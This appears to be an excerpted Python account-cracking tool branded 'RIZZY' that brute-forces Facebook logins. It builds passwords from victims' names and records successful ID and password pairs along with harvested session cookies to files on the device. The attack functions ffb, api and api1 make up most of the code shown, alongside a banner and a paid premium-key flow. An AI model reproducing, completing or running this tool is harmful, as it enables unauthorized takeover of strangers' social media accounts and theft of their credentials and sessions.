...
try:
    os.makedirs('/sdcard/RIZZY')
except:
    pass
sys.stdout.write('\x1b]2; RIZZZYYY\x07')
#<<_________[ LOGO ]_________>>#
logo=(f"""
88""Yb 88 8888P 8888P Yb  dP 
88__dP 88   dP    dP   YbdP  
88"Yb  88  dP    dP     8P   
88  Yb 88 d8888 d8888  dP    
\033[1;37m ================================================
    OPEN SOURCE BY RIzzzYyy...-!
\033[1;37m ================================================
 \033[1;97m[\033[1;92m•\033[1;97m] Owner    : RIZZY XD
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : RIZZZYY
...
def Menu(name,join,user,exp,left):
            clear()
            print("\033[1;97m [\033[1;92m•\033[1;97m] \033[1;97mYour Name : \033[1;92m"+name)
...
def ffb(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write('\r [RIZZY] %s | M1 OK/CP %s/%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r\033[1;92m [RIZZY-OK] '+ids+' | '+pas+f'\033[1;97m')
                                        os.system('espeak -a 300 " Crack,   Successful,"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                        cookies = f"sb={ssbb};{coki}"
                                        open('/sdcard/RIZZY/RIZZY-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/RIZZY/RIZZY-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        oks.append(ids);type(ids,pas,cookies)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        print(f'\r\r\033[1;91m [RIZZY-CP] '+ids+' | '+pas+f'\033[1;97m')
                                        open(f'/sdcard/RIZZY/RIZZY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:
                                        continue
...
def api(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write('\r [RIZZY] %s | M2 OK/CP %s/%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
...
def api1(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write('\r [RIZZY] %s | M3 OK/CP %s/%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
...
def subscription(message):
    ...
    line()
    print(f"\033[1;97m [\033[1;92m•\033[1;97m] \033[1;92mNote  \033[1;97m:  \033[1;92mWelcome To RIZZY Tool")
    line()
    ...
    tsk = "Hello RIZZY Sir ! I Need To Buy Your Premium Tools So Please Approve My Key-:)\n\nName: "+uname+" \nKey: "+key
